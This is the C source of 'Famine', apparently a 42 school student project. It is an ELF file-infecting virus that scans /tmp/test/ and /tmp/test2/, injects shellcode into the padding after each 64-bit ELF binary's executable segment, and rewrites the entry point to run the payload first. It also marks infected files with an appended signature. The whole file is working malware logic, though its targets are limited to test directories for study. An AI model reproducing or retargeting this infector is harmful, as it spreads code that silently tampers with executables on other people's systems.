/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/07/22 12:32:02 by fcadet            #+#    #+#             */
/*   Updated: 2022/07/24 14:48:51 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/syscall.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>

#include <stdio.h>

#define BUFF_SZ		1024
#define IDENT		"\x7f" "ELF" "\x2"
#define SIGN		"Famine (42 project) - 2022 - by apitoise & fcadet"
#define SIGN_SZ		49
#define PAGE_SZ		0x1000
#define PAGE_MSK	0xfffffffffffff000

extern uint8_t		sc;
extern uint8_t		sc_end;
extern uint8_t		sc_data;
extern uint8_t		sc_data_end;
extern uint64_t		sc_entry;
extern uint64_t		sc_old_entry;

typedef struct		s_hdrs {
	Elf64_Ehdr		*elf;
	Elf64_Phdr		*txt;
	Elf64_Phdr		*nxt;
}					t_hdrs;

typedef struct		s_sizes {
	uint64_t	mem;
	uint64_t	code;
	uint64_t	data;
	uint64_t	load;
	uint64_t	f_pad;
	uint64_t	m_pad;
}					t_sizes;

t_hdrs			hdrs = { 0 };
t_sizes			sz = { 0 };

int		ret_close(int fd, int ret) {
	if (fd >= 0)
		close(fd);
	return (ret);
}

void	get_full_path(char *s1, char *s2, uint8_t *buff) {
	for (; *s1; ++s1, ++buff)
		*buff = *s1;
	for (; *s2; ++s2, ++buff)
		*buff = *s2;
	*buff = '\0';
}

int		str_n_cmp(char *s1, char *s2, int n) {
	for (; *s1 && *s1 == *s2; ++s1, ++s2)
		if (!--n)
			break;
	return (*s1 - *s2);
}

int64_t			get_fd_size(int fd) {
	int64_t		size;

	if ((size = lseek(fd, 0, SEEK_END)) < 0 || lseek(fd, 0, SEEK_SET) != 0)
		return (-1);
	return (size);
}

int		write_pad(int fd, uint64_t size) {
	static uint8_t		buff[BUFF_SZ] = { 0 };
	uint64_t			write_sz = 0;
	int64_t				w_ret;

	for (; size; size -= write_sz) {
		write_sz = size < BUFF_SZ ? size : BUFF_SZ;
		if ((w_ret = write(fd, buff, write_sz)) < 0
				|| (uint64_t)w_ret != write_sz)
			return (-1);
	}
	return (0);
}

static int		map_file(uint8_t *path, uint8_t **mem) {
	int			src;
	int64_t		s_ret;

	if ((src = open((char *)path, O_RDWR)) < 0)
		return (-1);
	if ((s_ret = get_fd_size(src)) < 0
			|| (sz.mem = (uint64_t)s_ret) < sizeof(Elf64_Ehdr)
			|| (*mem = mmap(NULL, sz.mem,
					PROT_READ | PROT_WRITE, MAP_PRIVATE, src, 0)) == MAP_FAILED)
		return (ret_close(src, -1));
	return (ret_close(src, 0));
}

static void		write_mem(uint8_t *path, uint8_t *mem, int x_pad) {
	int			dst;
	int64_t		w_ret;
	uint64_t	code_offset;

	if ((dst = open((char *)path, O_WRONLY)) < 0)
		return;
	code_offset = hdrs.txt->p_offset + hdrs.txt->p_filesz - sz.load;
	if ((w_ret = write(dst, mem, code_offset)) < 0 || (uint64_t)w_ret != code_offset
			|| (w_ret = write(dst, &sc, sz.load)) < 0 || (uint64_t)w_ret != sz.load
			|| write_pad(dst, sz.f_pad + x_pad * PAGE_SZ - sz.load)
			|| ((w_ret = write(dst, mem + code_offset + sz.f_pad,
						sz.mem - (code_offset + sz.f_pad))) < 0
				|| (uint64_t)w_ret != sz.mem - (code_offset + sz.f_pad))
			|| write(dst, SIGN, SIGN_SZ) != SIGN_SZ)
	close(dst);
}

static int		test_elf_hdr(void) {
	if (str_n_cmp((char *)hdrs.elf->e_ident, (IDENT), 5)
			|| (hdrs.elf->e_type != ET_EXEC && hdrs.elf->e_type != ET_DYN)
			|| hdrs.elf->e_machine != EM_X86_64
			|| (hdrs.elf->e_shstrndx == SHN_UNDEF || hdrs.elf->e_shstrndx == SHN_XINDEX))
		return (-1);
	return (0);
}

static int		check_infection(uint8_t *mem) {
	if (sz.mem < SIGN_SZ)
		return (-1);
	if (!str_n_cmp((char *)(mem + sz.mem - SIGN_SZ), SIGN, SIGN_SZ))
		return (-1);
	return (0);
}

static int		find_txt_seg(uint8_t *mem) {
	Elf64_Phdr	*p_hdr;
	uint64_t	i;

	for (i = 0, p_hdr = (Elf64_Phdr *)(mem + hdrs.elf->e_phoff);
			!hdrs.txt && i < hdrs.elf->e_phnum; ++i, ++p_hdr)
		if (p_hdr->p_type == PT_LOAD && (p_hdr->p_flags & PF_X))
			hdrs.txt = p_hdr;
	if (!hdrs.txt || i == hdrs.elf->e_phnum)
		return (-1);
	hdrs.nxt = p_hdr;
	return (0);
}

static void		get_sizes(void) {
	sz.code = &sc_end - &sc;
	sz.data = &sc_data_end - &sc_data;
	sz.load = sz.data + sz.code;
	sz.f_pad = hdrs.nxt->p_offset - (hdrs.txt->p_offset + hdrs.txt->p_filesz);
	sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
}

static int		set_x_pad(uint8_t *mem, uint8_t *x_pad) {
	Elf64_Phdr	*p_hdr;
	Elf64_Shdr	*s_hdr;
	uint64_t	i;

	if (sz.f_pad < sz.load) {
		if (sz.m_pad >= sz.load) {
			for (i = 0, p_hdr = (Elf64_Phdr *)(mem + hdrs.elf->e_phoff);
					i < hdrs.elf->e_phnum; ++i, ++p_hdr)
				if (p_hdr->p_offset >= hdrs.txt->p_offset + hdrs.txt->p_filesz)
					p_hdr->p_offset += PAGE_SZ;
			for (i = 0, s_hdr = (Elf64_Shdr *)(mem + hdrs.elf->e_shoff);
					i < hdrs.elf->e_shnum; ++i, ++s_hdr)
				if (s_hdr->sh_offset >= hdrs.txt->p_offset + hdrs.txt->p_filesz)
					s_hdr->sh_offset += PAGE_SZ;
			*x_pad = 1;
		} else
			return (-1);
	}
	return (0);
}

static uint64_t		round_up(uint64_t val, uint64_t mod) {
	return (val % mod ? val / mod * mod + mod : val);
}

static int		update_mem(void) {
	if (syscall(10, (uint64_t)&sc_data & PAGE_MSK, round_up(sz.data, PAGE_SZ),
			PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
		return (-1);
	sc_entry = hdrs.txt->p_vaddr + hdrs.txt->p_memsz;
	sc_old_entry = hdrs.elf->e_entry;
	hdrs.elf->e_entry = sc_entry;
	hdrs.txt->p_filesz += sz.load;
	hdrs.txt->p_memsz += sz.load;
	return (0);
}

static void		proc_entries(uint8_t *ent_buff, uint64_t dir_ret, char *root_path) {
	uint8_t			*mem;
	uint16_t		ent_sz;
	uint8_t			path_buff[BUFF_SZ];
	uint8_t			*ent_ptr;
	uint8_t			x_pad;

	for (ent_ptr = ent_buff; dir_ret; dir_ret -= ent_sz, ent_ptr += ent_sz) {
		ent_sz = *(uint16_t *)(ent_ptr + 16);

		get_full_path(root_path, (char *)(ent_ptr + 18), path_buff);
		if (map_file(path_buff, &mem) < 0
				|| check_infection(mem))
			continue;
		hdrs.elf = (Elf64_Ehdr *)mem;
		if (test_elf_hdr()
				|| find_txt_seg(mem))
			goto unmap_continue;
		get_sizes();
		if (set_x_pad(mem, &x_pad)
				|| update_mem())
			goto unmap_continue;
		write_mem(path_buff, mem, x_pad);
		unmap_continue: munmap(mem, sz.mem);
	}
}

int		main(void) {
	int				dir_fd;
	uint64_t		i;
	int64_t			dir_ret;
	char			*dirs[] = { "/tmp/test/", "/tmp/test2/" };
	uint8_t			ent_buff[BUFF_SZ];

	for (i = 0; i < 2; ++i) {
		if ((dir_fd = open(dirs[i], O_RDONLY | O_DIRECTORY)) < 0)
			continue;
		while ((dir_ret = syscall(SYS_getdents, dir_fd, ent_buff, BUFF_SZ)) > 0)
			proc_entries(ent_buff, dir_ret, dirs[i]);
		close(dir_fd);
	}
}
